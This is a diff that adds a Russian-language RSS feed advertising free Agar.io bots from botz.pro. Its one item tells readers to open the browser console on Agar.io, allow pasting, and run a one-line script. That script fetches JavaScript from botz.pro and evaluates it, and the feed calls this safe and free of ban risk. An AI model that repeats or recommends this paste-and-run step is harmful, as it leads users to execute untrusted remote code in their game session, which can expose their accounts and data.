@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:media="https://botz.pro/viedo.mp4">
+  <channel>
+    <title>Agar.io Bots — свежие обновления и рабочие скрипты</title>
+    <link>https://botz.pro</link>
+    <description>Свежие обновления ботов Agar.io, рабочие скрипты, инструкции и новости проекта. Актуально на 2025 год.</description>
+    <language>ru</language>
+    <generator>Custom RSS Generator</generator>
+    <lastBuildDate>Tue, 03 Dec 2025 12:00:00 +0300</lastBuildDate>
+
+    <!-- Главное обновление -->
+    <item>
+      <title>🔥 Рабочие Agar.io боты — обновление ноябрь 2025</title>
+      <link>https://botz.pro</link>
+      <guid isPermaLink="true">https://botz.pro</guid>
+      <pubDate>Tue, 03 Dec 2025 12:00:00 +0300</pubDate>
+
+      <description><![CDATA[
+      <h2>Обновление ботов Agar.io — ноябрь 2025</h2>
+      <p>
+      Представляем обновлённую версию бесплатных <strong>Agar.io ботов и минионов</strong>. 
+      Полностью рабочие, безопасные, без скачивания, без риска бана.
+      </p>
+
+      <h3>Скрипт для запуска</h3>
+      <pre style="background:#222;color:#0f0;padding:12px;border-radius:8px;">
+eval(await (await fetch('//botz.pro/b')).text());
+      </pre>
+
+      <h3>Как использовать</h3>
+      <ol>
+        <li>Зайдите в Agar.io</li>
+        <li>Нажмите F12 → Console</li>
+        <li>Вставьте скрипт и нажмите Enter</li>
+        <li>Разрешите «Allow paste»</li>
+      </ol>
+
+      <p><strong>Спонсор проекта:</strong> <a href="https://agar.su">Agar.su</a> — русская версия Agar.io.</p>
+
+      <p style="color:#d22;font-weight:bold;">Важно: чрезмерное использование ботов может привести к временной блокировке IP.</p>
+      ]]></description>
+
+      <media:content 
+        url="https://botz.pro/icon.svg" 
+        medium="image" 
+        type="image/svg+xml"
+      />
+    </item>
+
+  </channel>
+</rss>
